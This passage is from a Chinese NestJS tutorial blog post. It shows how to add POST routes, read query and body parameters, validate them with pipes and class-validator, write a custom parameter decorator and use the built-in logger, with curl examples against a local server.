class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: &quot;gdccwxx&quot;&#125;&apos;</span><br></pre></td></tr></table></figure><p></p><p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-2/log.png\" alt=\"logger\"></p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><p>处理请求的基本方法就讲到这里，<a href=\"/nestJs/nest-js-tutorial-3/\" title=\"下一篇\">下一篇</a>会讲解如何连接数据库并使用</p>","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/nestJs/nest-js-tutorial-2/nestjs.png\" alt=\"nestjs\"></p><p>这个系列的<a href=\"/nestJs/nest-js-tutorial-1/\" title=\"上一篇\">上一篇</a>文章，教大家写了 hello world 和 新建 students 模块。</p><p>但是，那只是很干的 Get 请求；即没有 Post 请求，也没有给参数做检查；更没有日志的使用。</p><p>本篇接着往下讲，通过 NestJs 的原生能力，来实现 Post 请求，并做参数检查，最后利用原生日志模块实现标准化日志。</p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><h1 id=\"一、Post-请求\"><a href=\"#一、Post-请求\" class=\"headerlink\" title=\"一、Post 请求\"></a>一、Post 请求</h1><p>经过上篇的介绍，总体请求先会经过 students.controller.ts -&gt; 再到 students.service.ts。</p><p>在 students.service.ts 上新增 <code>Post</code> 方法<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Controller, Get, Post &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// @Get('who-are-you') ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYouPost() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>通过 curl 访问地址<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST  http://127.0.0.1:3000/students/who-are-you</span><br><span class=\"line\">// =&gt; Im student%</span><br></pre></td></tr></table></figure><p></p><p>通过替换装饰器，就可以快速实现 <code>Post</code> 请求。</p><h1 id=\"二、请求参数\"><a href=\"#二、请求参数\" class=\"headerlink\" title=\"二、请求参数\"></a>二、请求参数</h1><p>正常请求都会加上参数，<code>Get</code> 和 <code>Post</code> 方法加参数略有不同。</p><p>先看 Get 请求</p><h2 id=\"Get-请求参数\"><a href=\"#Get-请求参数\" class=\"headerlink\" title=\"Get 请求参数\"></a>Get 请求参数</h2><p>Get 请求的参数一般会放在 URL 上，这是 <code>@Query</code> 装饰器就派上用场了。</p><p>先改造 controller</p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Controller, Get, Post, Query &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYou(<span class=\"meta\">@Query</span>(<span class=\"string\">'name'</span>) name: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>再改造 service</p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    ImStudent(name?: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Im student '</span> + name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>通过浏览器访问 url<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">http://localhost:3000/students/who-are-you?name=gdccwxx</span><br><span class=\"line\">// =&gt; Im student gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>这样 Get 请求就能获取到 name 参数了</p><h2 id=\"Post-参数\"><a href=\"#Post-参数\" class=\"headerlink\" title=\"Post 参数\"></a>Post 参数</h2><p>Post 参数有些不同，会用到 <a href=\"https://baike.baidu.com/item/DTO/16016821\" target=\"_blank\" rel=\"noopener\">DTO</a> 的传输。因为数据通过 HTTP 传输是文本类型，因此需要将文本类型转化成代码可识别的变量。</p><p>新建 students.dto.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/students/dtos/students.dto.ts</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentDto &#123;</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>编辑 students.controller.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Body, Controller, Get, Post, Query &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentDto &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./dtos/students.dto'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.service'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// @Get('who-are-you') ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYouPost(<span class=\"meta\">@Body</span>() student: StudentDto) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(student.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>命令行访问<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST -d&quot;name=gdccwxx&quot;  http://127.0.0.1:3000/students/who-are-you</span><br><span class=\"line\">// =&gt; Im student gdccwxx%</span><br></pre></td></tr></table></figure><p></p><p>\bpost 方法传递的参数是通过请求 body 给到后台的。需要通过 <code>@Body</code> 装饰器解析 Body 中的数据。</p><h1 id=\"三、参数限制与转换\"><a href=\"#三、参数限制与转换\" class=\"headerlink\" title=\"三、参数限制与转换\"></a>三、参数限制与转换</h1><p>这部分其实用到了 <a href=\"https://docs.nestjs.com/pipes\" target=\"_blank\" rel=\"noopener\">管道</a> 的概念，我们用基础管道来实现，更高阶用法将会放在<a href=\"/nestJs/nest-js-tutorial-4/\" title=\"第四章\">第四章</a>中</p><h2 id=\"Get-请求\"><a href=\"#Get-请求\" class=\"headerlink\" title=\"Get 请求\"></a>Get 请求</h2><p>get 请求需要用到 <code>ParseIntPipe</code>, 更多的内置管道列表可查看<a href=\"https://docs.nestjs.com/pipes#built-in-pipes\" target=\"_blank\" rel=\"noopener\">这里</a></p><p>浏览器访问的 url 默认是 string 类型，<code>ParseIntPipe</code> 管道能将 string 类型转化成 number 类型</p><p>这次我们实现的是通过 id 查找学生姓名。</p><p>修改 students.service.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ImStudent...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    getStudentName(id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ID_NAME_MAP = &#123;</span><br><span class=\"line\">            <span class=\"number\">1</span>: <span class=\"string\">'gdccwxx'</span>,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ID_NAME_MAP[id] ?? <span class=\"string\">'not found'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>修改 students.controller.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Body, Controller, Get, Post, Query, ParseIntPipe &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ... </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// @Get('who-are-you') ..</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// @Post('who-are-you') ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'get-name-by-id'</span>)</span><br><span class=\"line\">    getNameById(<span class=\"meta\">@Query</span>(<span class=\"string\">'id'</span>, ParseIntPipe) id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.getStudentName(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>浏览器使用参数访问<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌</span><br><span class=\"line\">http://localhost:3000/students/get-name-by-id?id=gdccwxx</span><br><span class=\"line\">// =&gt; &#123;</span><br><span class=\"line\">//     statusCode: 400,</span><br><span class=\"line\">//     message: &quot;Validation failed (numeric string is expected)&quot;,</span><br><span class=\"line\">//     error: &quot;Bad Request&quot;</span><br><span class=\"line\">// &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">// ✅</span><br><span class=\"line\">http://localhost:3000/students/get-name-by-id?id=1</span><br><span class=\"line\">// =&gt; gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>当使用非法请求，导致无法转换时，NestJs 会将请求报错处理，而正确参数则会转换后调用调用相应函数。通过简单的装饰器引用， NestJs 框架就可以自动做了参数检查与转换了</p><h2 id=\"Post-请求\"><a href=\"#Post-请求\" class=\"headerlink\" title=\"Post 请求\"></a>Post 请求</h2><p>Post 请求略微有些不一样，要用到 class-validator</p><p>安装 class-validator<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i --save class-validator class-transformer</span><br></pre></td></tr></table></figure><p></p><p>修改 main.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// main.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; NestFactory &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; ValidationPipe &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; AppModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./app.module'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bootstrap</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> app = <span class=\"keyword\">await</span> NestFactory.create(AppModule);</span><br><span class=\"line\">  app.useGlobalPipes(<span class=\"keyword\">new</span> ValidationPipe());</span><br><span class=\"line\">  <span class=\"keyword\">await</span> app.listen(<span class=\"number\">3000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bootstrap();</span><br></pre></td></tr></table></figure><p></p><p>修改 student.dto.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; IsNotEmpty, IsString &#125; <span class=\"keyword\">from</span> <span class=\"string\">'class-validator'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentDto &#123;</span><br><span class=\"line\">    <span class=\"meta\">@IsNotEmpty</span>()</span><br><span class=\"line\">    <span class=\"meta\">@IsString</span>()</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>通过命令行访问<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌</span><br><span class=\"line\">curl -X POST  http://127.0.0.1:3000/students/who-are-you</span><br><span class=\"line\">// =&gt; &#123;&quot;statusCode&quot;:400,&quot;message&quot;:[&quot;name must be a string&quot;,&quot;name should not be empty&quot;],&quot;error&quot;:&quot;Bad Request&quot;&#125;%</span><br><span class=\"line\"></span><br><span class=\"line\">// ❌</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: 1&#125;&apos;</span><br><span class=\"line\">// =&gt; &#123;&quot;statusCode&quot;:400,&quot;message&quot;:[&quot;name must be a string&quot;],&quot;error&quot;:&quot;Bad Request&quot;&#125;% </span><br><span class=\"line\"></span><br><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: &quot;gdccwxx&quot;&#125;&apos;</span><br><span class=\"line\">// =&gt; Im student gdccwxx%</span><br></pre></td></tr></table></figure><p></p><p>到此，参数校验部分也就完成。</p><h1 id=\"四、自定义装饰器\"><a href=\"#四、自定义装饰器\" class=\"headerlink\" title=\"四、自定义装饰器\"></a>四、自定义装饰器</h1><p>在 post 请求用到了大量的装饰器，系统装饰器能满足大部分场景，但是有些特定需求时，需要自定义装饰器。</p><p>例如这样一个场景：每个请求都会带上 <code>user</code> 字段。代表是谁做的请求，每次在代码里 getUser 是非常难受的事情，这时自定义装饰器就派上了用场。</p><p>新建 src/common/decorators.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/decorators.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; createParamDecorator, ExecutionContext &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> User = createParamDecorator(</span><br><span class=\"line\">  (data: unknown, ctx: ExecutionContext) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> request = ctx.switchToHttp().getRequest(); <span class=\"comment\">// 拿到请求</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> request.body.user;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure><p></p><p>修改 students.controller.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Body, Controller, Get, Post, Query, ParseIntPipe &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; User &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/decorators'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">    <span class=\"comment\">// @Get('who-are-you') ...</span></span><br><span class=\"line\">    <span class=\"comment\">// @Post('who-are-you') ...</span></span><br><span class=\"line\">    <span class=\"comment\">// @Get('get-name-by-id')...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-is-request'</span>)</span><br><span class=\"line\">    whoIsReq(<span class=\"meta\">@User</span>() user: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> user;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>命令行访问<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-is-request -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; gdccwxx%</span><br></pre></td></tr></table></figure><p></p><p>通过自定义装饰器，并将其挂在函数上，代码就能优雅的获取是谁请求的借口。</p><h1 id=\"五、日志\"><a href=\"#五、日志\" class=\"headerlink\" title=\"五、日志\"></a>五、日志</h1><p>后台接口请求常伴随日志产生，日志对后台查问题至关重要。NestJs 框架也集成了日志，开箱即用。</p><p>使用日志分为三步:</p><ul><li>main.ts 引入 <code>Logger</code></li><li>模块引入日志组建: <code>private readonly logger = new Logger(StudentsService.name)</code>;</li><li>在需要打印的地方引入: this.logger.log(`student name is ${name}`);</li></ul><p>修改main.ts<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// main.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; NestFactory &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; ValidationPipe, Logger &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; AppModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./app.module'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bootstrap</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> app = <span class=\"keyword\">await</span> NestFactory.create(AppModule, &#123;</span><br><span class=\"line\">    logger: <span class=\"keyword\">new</span> Logger(),</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure><p></p><p>引用 Logger 组建<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable, Logger &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> readonly logger = <span class=\"keyword\">new</span> Logger(StudentsService.name);</span><br><span class=\"line\"></span><br><span class=\"line\">    ImStudent(name?: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.logger.log(<span class=\"string\">`student name is <span class=\"subst\">$&#123;name&#125;</span>`</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Im student '</span> + name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    getStudentName(id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.logger.log(<span class=\"string\">`get student id is <span class=\"subst\">$&#123;id&#125;</span>`</span>);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ID_NAME_MAP = &#123;</span><br><span class=\"line\">            <span class=\"number\">1</span>: <span class=\"string\">'gdccwxx'</span>,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ID_NAME_MAP[id] ?? <span class=\"string\">'not found'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>访问接口，控制台输出<br></p><figure class=\"highlight 